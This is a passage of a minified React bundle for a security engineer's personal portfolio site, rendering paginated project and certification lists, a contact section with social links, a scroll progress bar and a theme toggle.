projects"})})]}),t&&c.jsx(om,{activeFilter:s,onFilterChange:m}),t&&c.jsx(cm,{items:o}),c.jsx("div",{className:"projects-list",children:f.map(v=>{var k;return c.jsxs("div",{className:"project-row",children:[c.jsxs("div",{className:"project-row-body",children:[c.jsx("a",{href:v.href,target:"_blank",rel:"noreferrer",className:"project-title-link",children:c.jsx("h5",{className:"project-title",children:v.title})}),c.jsx("p",{className:"project-description",children:v.description}),(k=v.tags)!=null&&k.length?c.jsx("div",{className:"project-tags",children:v.tags.map(w=>c.jsx("span",{className:"pill",children:w},w))}):null]}),c.jsx("div",{className:"project-row-cta",children:c.jsx("a",{href:v.href,target:"_blank",rel:"noreferrer",className:"view-credentials",children:"View"})})]},v.title)})}),g>1&&c.jsxs("div",{className:"blog-pagination project-pagination",children:[c.jsx("button",{className:"pill",disabled:a===1,onClick:()=>l(Math.max(1,a-1)),children:"Previous"}),c.jsxs("span",{className:"blog-page-indicator",children:["Page ",a," of ",g]}),c.jsx("button",{className:"pill",disabled:a===g,onClick:()=>l(Math.min(g,a+1)),children:"Next"})]})]})})}function pm(){return c.jsxs(c.Fragment,{children:[c.jsx("header",{className:"blog-welcome-section",children:c.jsxs("div",{className:"container text-center",children:[c.jsx("h1",{children:"Projects"}),c.jsx("p",{className:"blog-subtitle",children:"A focused list of what I’ve shipped and explored."})]})}),c.jsx(um,{items:Bf,showHeader:!1})]})}function dm({issuer:e="Cert"}){var t;const n=((t=e==null?void 0:e[0])==null?void 0:t.toUpperCase())||"C";return c.jsx("div",{className:"cert-badge",children:n})}const hm=["All","Security","Cloud","Networking"];function fm({items:e,showViewAll:n=!1,showHeader:t=!0}){const[s,r]=x.useState("All"),[a,l]=x.useState(1),i=5,o=x.useMemo(()=>s==="All"?e:e.filter(m=>m.domain?m.domain===s:!0),[s,e]),u=Math.max(1,Math.ceil(o.length/i)),g=o.slice((a-1)*i,a*i),f=m=>{r(m),l(1)};return c.jsx("section",{className:"certifications",id:"certs",children:c.jsxs("div",{className:"container",children:[t&&c.jsxs("div",{className:"section-header",children:[c.jsx("div",{children:c.jsx("h2",{children:"CERTIFICATIONS"})}),n&&c.jsx("div",{className:"section-actions",children:c.jsx(Ue,{className:"link-button",to:"/certifications",children:"View all certifications"})})]}),t&&c.jsx("div",{className:"filter-chips",children:hm.map(m=>c.jsx("button",{className:`chip ${m===s?"active":""}`,type:"button",onClick:()=>f(m),children:m},m))}),c.jsx("div",{className:"cert-list",children:g.map(m=>c.jsxs("div",{className:"cert-row",children:[c.jsxs("div",{className:"cert-row-meta",children:[c.jsx("div",{className:"cert-row-badge",children:c.jsx(dm,{issuer:m.issuer})}),c.jsxs("div",{className:"cert-row-tags",children:[c.jsx("span",{className:"pill",children:m.domain}),c.jsx("span",{className:"pill",children:m.issuer})]})]}),c.jsxs("div",{className:"cert-row-body",children:[c.jsx("div",{className:"cert-row-title",children:m.title}),c.jsx("p",{className:"cert-row-details",children:m.details})]}),c.jsx("div",{className:"cert-row-cta",children:c.jsx("a",{href:m.href,className:"view-credentials",target:"_blank",rel:"noreferrer",children:"View"})})]},m.title))}),u>1&&c.jsxs("div",{className:"blog-pagination project-pagination",children:[c.jsx("button",{className:"pill",disabled:a===1,onClick:()=>l(Math.max(1,a-1)),children:"Previous"}),c.jsxs("span",{className:"blog-page-indicator",children:["Page ",a," of ",u]}),c.jsx("button",{className:"pill",disabled:a===u,onClick:()=>l(Math.min(u,a+1)),children:"Next"})]})]})})}function mm(){return c.jsxs(c.Fragment,{children:[c.jsx("header",{className:"blog-welcome-section",children:c.jsxs("div",{className:"container text-center",children:[c.jsx("h1",{children:"Certifications"}),c.jsx("p",{className:"blog-subtitle",children:"Credentials and exams I’ve completed."})]})}),c.jsx(fm,{items:Ff,showHeader:!1})]})}function gm(){const e="hemparekh1596@gmail.com",[n,t]=x.useState(!1),s=()=>{navigator.clipboard&&navigator.clipboard.writeText(e).then(()=>{t(!0),setTimeout(()=>t(!1),1800)}).catch(()=>{})};return c.jsx("section",{className:"contact-strip",id:"contact",children:c.jsxs("div",{className:"container contact-grid",children:[c.jsxs("div",{children:[c.jsx("p",{className:"pill",children:"Let’s talk"}),c.jsx("h2",{children:"Leave a message after the beep (Jim’s prank pending)."}),c.jsx("p",{className:"contact-blurb",children:"Let’s connect to collaborate on security engineering or privacy-focused initiatives."}),n&&c.jsx("p",{className:"contact-blurb",children:"Copied. Threat level: Midnight."})]}),c.jsxs("div",{className:"contact-actions",children:[c.jsx("button",{className:"button primary",onClick:s,type:"button",children:"Copy Email"}),c.jsx("a",{className:"button ghost",href:"https://www.linkedin.com/in/hem-parekh/",target:"_blank",rel:"noreferrer",children:"LinkedIn"}),c.jsx("a",{className:"button ghost",href:"https://github.com/Hem1700",target:"_blank",rel:"noreferrer",children:"GitHub"})]})]})})}function vm(){const[e,n]=x.useState(0);return x.useEffect(()=>{const t=()=>{const{scrollTop:s,scrollHeight:r,clientHeight:a}=document.documentElement,l=r>a?s/(r-a)*100:0;n(Math.min(100,Math.max(0,l)))};return t(),window.addEventListener("scroll",t,{passive:!0}),()=>window.removeEventListener("scroll",t)},[]),c.jsx("div",{className:"scroll-progress",children:c.jsx("div",{className:"scroll-progress__bar",style:{width:`${e}%`}})})}function ym(){const[e,n]=x.useState(!1);return x.useEffect(()=>{const t=()=>n(window.scrollY>400);return window.addEventListener("scroll",t,{passive:!0}),t(),()=>window.removeEventListener("scroll",t)},[]),e?c.jsx("button",{className:"back-to-top",type:"button","aria-label":"Back to top",title:"World’s Best Dundie takes you up.",onClick:()=>window.scrollTo({top:0,behavior:"smooth"}),children:"↑"}):null}function km(){const[e,n]=x.useState(()=>typeof window>"u"?"light":localStorage.getItem("theme")||"light");return x.useEffect(()=>{const s=document.body;s.classList.remove("light","dark"),s.classList.add(e),localStorage.setItem("theme",e)},[e]),{theme:e,toggleTheme:()=>{n(s=>s==="light"?"dark":"light")}}}function wm(){const{theme:e,toggleTheme:n}=km();return c.jsx(Sf,{children:c.jsxs("div",{className:"app-shell",children:[c.jsx(vm,{}),c.jsx(Cf,{onToggleTheme:n,theme:e}),c.jsx("main",{children:c.jsxs(gf,{children:[c.jsx(_n,{path:"/",element:c.jsx(wo,{})}),c.jsx(_n,{path:"/blogs",element:c.jsx($f,{})}),c.jsx(_n,{path:"/projects",element:c.jsx(pm,{})}),c.jsx(_n,{path:"/certifications",element:c.jsx(mm,{})}),c.jsx(_n,{path:"/blog/:slug",element:c.jsx(lm,{})}),c.jsx(_n,{path:"*",element:c.jsx(wo,{})})]})}),c.jsx(gm,{}),c.jsx(Pf,{}),c.jsx(ym,{})]})})}ju(document.getElementById("root")).render(c.jsx(Oo.StrictMode,{children:c.jsx(wm,{})}));
